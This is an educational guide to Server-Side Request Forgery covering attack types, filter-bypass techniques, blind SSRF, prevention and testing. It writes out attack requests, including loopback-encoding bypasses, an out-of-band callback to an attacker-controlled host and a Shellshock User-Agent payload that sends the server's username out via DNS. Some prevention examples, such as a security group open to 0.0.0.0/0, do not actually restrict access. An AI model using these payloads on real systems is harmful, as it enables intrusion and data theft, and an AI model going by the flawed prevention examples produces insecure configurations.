# Server-Side Request Forgery (SSRF)

## What is SSRF?

SSRF is a type of web security vulnerability that allows an attacker to send crafted requests from the server-side application to unintended locations, including internal services or external domains. This vulnerability occurs when a web application accepts a URL or other input from a user and uses it to make requests without proper validation or sanitization.

## How do SSRF vulnerabilities arise?

SSRF vulnerabilities typically arise in web applications that fetch data from a user-supplied URL. For instance, an application may allow users to submit a URL to retrieve metadata, images, or other resources. If the application does not validate the input properly, an attacker can manipulate the URL to target internal resources or services that are not normally accessible from the outside.

Consider a web application that allows users to submit a URL to fetch and display an image:

```html
<form action="/fetch-image" method="POST">
    <input type="text" name="url" placeholder="Enter image URL"/>
    <input type="submit" value="Fetch Image"/>
</form>
```

If the backend code looks like this:

```kotlin
val imageUrl = request.getParameter("url")
val image: BufferedImage = ImageIO.read(URL(imageUrl))
```

A malefactor could submit a request with a URL pointing to an internal service, such as:

```
http://localhost:8080/admin
```

If the server processes this request without validation, it could expose sensitive information or allow further exploitation.

## What is the impact of SSRF attacks?

SSRF vulnerabilities can have severe security implications for both the affected application and the broader network environment:

1. **Internal Services Access**: Malicious users can use SSRF to access internal services that are not exposed to the public internet. This could include administrative interfaces, databases, or other critical services that are meant to be restricted.

2. **Data Exfiltration**: SSRF can be used to retrieve sensitive data from internal systems. For instance, a malicious user could exploit SSRF to access metadata from cloud service providers, which may include sensitive information such as IAM roles, API keys, and other credentials.

3. **Port Scanning**: Malicious users can leverage SSRF to perform port scanning on internal networks, identifying which services are running on which ports. This information can help them plan further actions.

4. **Denial of Service (DoS)**: By sending numerous requests to internal services, a malicious user can cause a denial of service, overwhelming the target service and making it unavailable to legitimate users.

## Types of SSRF attacks

SSRF attacks can be categorized based on their targets and techniques. Understanding these different types is essential for identifying and mitigating potential vulnerabilities in web applications.

### Attacks targeting the server itself

In this type of attack, the malicious user targets the server hosting the vulnerable application. By sending crafted requests, they can access sensitive information or services running on the same server.

If a web application allows users to fetch metadata from a URL, a malicious user might exploit this to access the server's local files or services:

```http
POST /fetch-metadata HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://localhost:8080/admin
```

This request could potentially expose sensitive information from the `/admin` endpoint running on the server.

### Attacks targeting other back-end systems or internal networks

Malicious users can also leverage SSRF to target internal systems or services that are not accessible from the public internet. This can include databases, internal APIs, or other microservices.

Consider a scenario where a web application retrieves data from a user-supplied URL. A malicious user could craft a request to access an internal database service:

```http
POST /fetch-data HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://internal-database-service:5432
```

If the application processes this request without validation, it may allow the malicious user to interact with the internal database, potentially leading to data exfiltration or manipulation.

### Why do applications implicitly trust local requests?

Applications may exhibit this behavior of implicitly trusting requests originating from the local machine for several reasons:

- **Access Control Checks**: The access control mechanisms might be implemented in a separate component that precedes the application server. When a request is made back to the server, these checks can be inadvertently bypassed.

- **Disaster Recovery Considerations**: In some cases, applications may permit administrative access without authentication for users connecting from the local machine. This design is intended to enable system recovery for administrators who may have lost their credentials, under the assumption that only trusted users would access the server directly.

- **Separate Administrative Interfaces**: The administrative interface may operate on a different port than the main application. If this interface is not directly accessible to users, it may create a false sense of security regarding its exposure.

Such trust relationships, where requests from the local machine are treated differently than those from external sources, often lead to SSRF vulnerabilities becoming critical security issues.

## Bypassing common SSRF defenses

Malicious users often seek ways to circumvent defenses implemented to mitigate SSRF vulnerabilities. Below are some common techniques they may employ, along with examples of how each can be exploited.

For additional techniques, please refer to this [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet).

### Blacklist-based input filters

Many applications attempt to prevent SSRF by maintaining a blacklist of known harmful URLs or IP addresses. However, this approach can be easily bypassed.

If an application blocks requests to `localhost` and `127.0.0.1`, a malicious user might use alternative representations of the loopback address, such as:

```http
POST /fetch-data HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://127.1
```

This request could still reach the `localhost`, as the server interprets `127.1` as a valid address.

You can try additional techniques like:
- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1.`.
- Register your own domain name that resolves to `127.0.0.1` or you can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

### Whitelist-based input filters

Some applications implement whitelisting to allow only certain URLs or domains. However, if the whitelist is not comprehensive, it can also be bypassed.

Suppose a whitelist allows requests to a specific internal service but does not enforce strict domain checks. A malicious user might exploit this by manipulating the URL encoding:

```http
POST /fetch-data HTTP/1.1
Host: vulnerable-application.com
Content-Type: application/x-www-form-urlencoded

url=http%3A%2F%2Finternal-service%3A8080
```

In this case, if the application decodes the URL improperly, it may still reach the internal service.

The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using these methods:

- You can embed credentials in a URL before the hostname, using `@` character. For example: `https://expected-host:fakepassword@evil-host`.
- You can use `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can also try double-encoding characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
- You can use combinations of these techniques together.

### Open redirection

Malicious users can exploit open redirection vulnerabilities to redirect requests to unintended destinations, including internal services.

If an application allows redirection based on user input, a malicious user could craft a request like this:

```http
GET /redirect?url=http://internal-service:8080 HTTP/1.1
```

If the application does not validate the redirection properly, it may redirect to an internal service, allowing access to sensitive information.

## Blind SSRF vulnerabilities

Blind SSRF vulnerabilities occur when a malicious user can make requests to internal services, but they do not receive direct feedback or responses from those requests. Unlike regular SSRF, where the response can be observed directly, in blind SSRF, the user must rely on indirect indicators to infer the success or failure of their requests.

### How blind SSRF differs from regular SSRF?

In regular SSRF, a malicious user can directly see the response from the internal service, which may contain sensitive information. In contrast, blind SSRF does not provide such feedback, making it more challenging to exploit but still dangerous.

### How to detect and exploir blind SSRF vulnerability?

Malicious users can employ various techniques to detect and exploit blind SSRF vulnerabilities. Below are some of them.

#### Timing attacks

By measuring the time taken for the application to respond, a malicious user can infer whether the internal request was successful. For example, they might send a request to an internal service and introduce a delay in the response to see if the overall response time changes.

   ```http
   GET /fetch-data?url=http://internal-service:8080/some-endpoint?delay=5000 HTTP/1.1
   ```

#### Error-based attacks

Malicious users can send requests that are likely to produce errors, allowing them to infer information based on the application's behavior. For instance, they might request a non-existent resource on an internal service.

   ```http
   GET /fetch-data?url=http://internal-service:8080/nonexistent HTTP/1.1
   ```

   If the application handles this gracefully or provides specific error messages, the malicious user can gather information about the internal service.

#### Out-of-band channels

A common technique involves using an external service that the application interacts with, such as a web server under the control of the malicious user. By sending a request to this external service, the malicious user can observe the incoming requests to infer information about the internal network.

```http
GET /fetch-data?url=http://malicious-user-controlled-server.com/track?target=http://internal-service:8080 HTTP/1.1
```

The external server can log the requests, allowing the malicious user to determine if the internal service was contacted.

However, there might be one catch. It is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied domain, but no subsequent HTTP request. This typically happens because the application attempted to make an HTTP request to the domain, which caused the initial DNS lookup, but the actual HTTP request was blocked by network-level filtering. It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations.

## Hidden attack surfaces for SSRF

Identifying hidden attack surfaces for SSRF vulnerabilities is crucial for effectively securing web applications. Malicious users often look for overlooked areas where SSRF can be exploited. Let's look at some methods to uncover these hidden attack surfaces.

### Partial URLs in requests

Sometimes, web applications may accept partial URLs or relative paths. Malicious users can exploit this by crafting requests that utilize these partial inputs to access internal resources.

If an application accepts a partial URL like this:

```http
POST /fetch-data HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=/internal-service/api
```

A malicious user could manipulate the input to access unintended internal resources by appending or altering the path.

### URLs within data formats

Web applications often process data in various formats, such as JSON or XML. These formats can contain URLs that may not be properly validated.

Consider a JSON payload that includes a URL:

```json
{
    "url": "http://internal-service:8080/resource"
}
```

A malicious user could submit a crafted JSON payload to access internal services:

```http
POST /api/submit HTTP/1.1
Content-Type: application/json

{
    "url": "http://internal-service:8080/admin"
}
```

If the application does not validate the URL properly, it may lead to an SSRF vulnerability.

### SSRF through the Referer header

Some applications use server-side analytics software to tracks visitors. This software often logs the `Referer` header in requests, so it can track incoming links. Often the analytics software visits any third-party URLs that appear in the `Referer` header. This is typically done to analyze the contents of referring sites, including the anchor text that is used in the incoming links.

A malicious user might craft a request like this:

```http
GET /api/resource HTTP/1.1
Host: vulnerable-application.com
Referer: http://internal-service:8080/admin
```

If the application uses the `Referer` header to make requests without proper validation, it could lead to unintended access to internal resources.

### SSRF leading to remote code execution

Another avenue for exploiting blind SSRF vulnerabilities is to induce the application to connect to a system under the malefactor's control, and return malicious responses to the HTTP client that makes the connection. If you can exploit a serious client-side vulnerability in the server's HTTP implementation, you might be able to achieve remote code execution within the application infrastructure.

For example, consider a situation when a server follows a link sent in `Referer` header. If you observe that the server included some information from the initial request, like `User-Agent` header, than you can try to embed malicous payload to check for a possible command execution like this:

```http
GET /api/resource HTTP/1.1
Host: vulnerable-application.com
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).malicious-domain
Referer: http://internal-service:8080/admin
```

If the server is vulnerable to Shellshock attack he will initiate a DNS request to the malicous domain containing the username of the vulnerable host in the subdomain.

## How to prevent SSRF attacks?

Mitigating SSRF vulnerabilities requires a multi-faceted approach that includes input validation, access controls, and robust application design. Beloware some of the best practices for preventing SSRF attacks.

### Input validation and sanitization

Implement strict validation and sanitization of user-supplied URLs. Ensure that inputs conform to expected formats and do not allow arbitrary URLs:

```kotlin
fun isValidUrl(url: String): Boolean {
    val regex = Regex("^(http|https)://[a-zA-Z0-9.-]+(:[0-9]{1,5})?(/.*)?$")
    return regex.matches(url)
}

val userInputUrl = request.getParameter("url")
if (!isValidUrl(userInputUrl)) {
    throw IllegalArgumentException("Invalid URL")
}
```

### Restrict internal network access

Limit the ability of web applications to make requests to internal services. Use network-level controls such as firewalls and security groups to restrict access to sensitive internal resources.

Here is an example of such configuration for "AWS Security Group":
```json
{
    "IpPermissions": [
        {
            "IpProtocol": "tcp",
            "FromPort": 8080,
            "ToPort": 8080,
            "IpRanges": [
                {
                    "CidrIp": "0.0.0.0/0",
                    "Description": "Allow access from the web application"
                }
            ]
        }
    ]
}
```

### Use a proxy for external requests

Implement a proxy server to handle all external requests. This allows for better control over outgoing requests and can help filter potentially harmful URLs.

Here is an example of such configuration for Nginx web server:
```nginx
server {
    listen 80;

    location /fetch {
        proxy_pass http://backend-service;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### Implement logging and monitoring

Set up logging and monitoring for outgoing requests made by the application. This can help detect unusual patterns or potential exploitation attempts.

Here is an example code for Kotlin:
```kotlin
logger.info("Fetching URL: $userInputUrl")
```

## How to identify possible SSRF vulnerabilities?

To effectively identify potential SSRF vulnerabilities in web applications, you can follow a systematic methodology:

- **Review the App**: Familiarize yourself with the application's architecture and functionality. Identify any features that involve fetching data from URLs, such as image upload, metadata retrieval, or API calls.

- **Identify User Input Points**: Locate all areas in the application where user input is accepted, especially those that may involve URLs.

- **Examine Input Handling**: Investigate how the application processes user-supplied URLs. Check if there are any validation or sanitization mechanisms in place.

- **Test with Various Inputs**: Attempt to input a variety of URLs, including:
  - Localhost (`http://localhost`, `http://127.0.0.1`).
  - Internal IP addresses (e.g., `http://192.168.1.1`).
  - Non-standard ports (e.g., `http://localhost:8080`).
  - Encoded or malformed URLs to bypass filters.

- **Evaluate Access Control Mechanisms**: Determine whether the application enforces proper access controls for internal resources. Identify if any checks are implemented at a different layer or component.

- **Check for Administrative Interfaces**: Look for any administrative functions that might be accessible without proper authentication when accessed from the local machine.

- **Craft Requests**: Use tools like Burp Suite, Postman, or cURL to craft requests targeting internal services. Monitor the responses to see if sensitive data is returned.

- **Utilize Timing and Error-Based Techniques**: If direct feedback is not available, employ timing attacks or send requests designed to produce errors to infer information about internal services.

- **Review Data Formats**: Inspect data formats (like JSON or XML) for URLs that may not be validated properly.

- **Check HTTP Headers**: Analyze HTTP headers, such as the `Referer` header, to see if they can be manipulated to access internal services.

- **Record Vulnerabilities**: Document any identified SSRF vulnerabilities, including the input points, potential impacts, and suggested remediation steps.

## Tools and Extensions

### Collaborator Everywhere

[Collaborator Everywhere](https://github.com/portswigger/collaborator-everywhere) is a powerful Burp Suite extension designed to enhance the capabilities of penetration testers by facilitating the detection of various vulnerabilities, including SSRF.

#### How it works?

Collaborator Everywhere integrates with Burp Suite to allow users to leverage the functionality of the Burp Collaborator, a service that can detect and analyze interactions initiated by the application. This extension enables testers to generate unique payloads that can be used to identify SSRF vulnerabilities by observing how the application interacts with external services:

- **Dynamic Payload Generation**: Collaborator Everywhere can automatically generate payloads that include unique URLs pointing to the Burp Collaborator service. This allows testers to track incoming requests and responses from the application.

- **Real-Time Monitoring**: The extension provides real-time feedback on interactions with the Collaborator service, enabling users to see if the application is making requests to the generated URLs.

- **Versatile Testing**: Beyond SSRF, Collaborator Everywhere can be used to test for other vulnerabilities, such as blind SSRF, open redirection, and more, by sending crafted requests that interact with the Collaborator service.

#### Why is it usefull?

When testing for SSRF vulnerabilities, Collaborator Everywhere can be particularly useful in the following ways:

1. **Identifying Internal Requests**: By using the Collaborator URLs, testers can determine if the application is making requests to internal services. If the application successfully contacts the Collaborator service, it indicates an SSRF vulnerability.

2. **Blind SSRF Detection**: For blind SSRF vulnerabilities, the extension allows testers to observe whether the application attempts to reach the Collaborator service without directly receiving feedback from the internal requests.

3. **Ease of Use**: The integration with Burp Suite simplifies the process of testing for SSRF vulnerabilities, making it easier for security professionals to identify and document potential issues.

## Labs

- [SSRF - PortSwigger](https://portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf)

## Videos

- [SSRF in 100 seconds](https://www.youtube.com/watch?v=3dKavgfL2pA)

## References

- [SSRF vulnerabilities](https://portswigger.net/web-security/ssrf)
- [Blind SSRF vulnerabilities](https://portswigger.net/web-security/ssrf/blind)
- [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)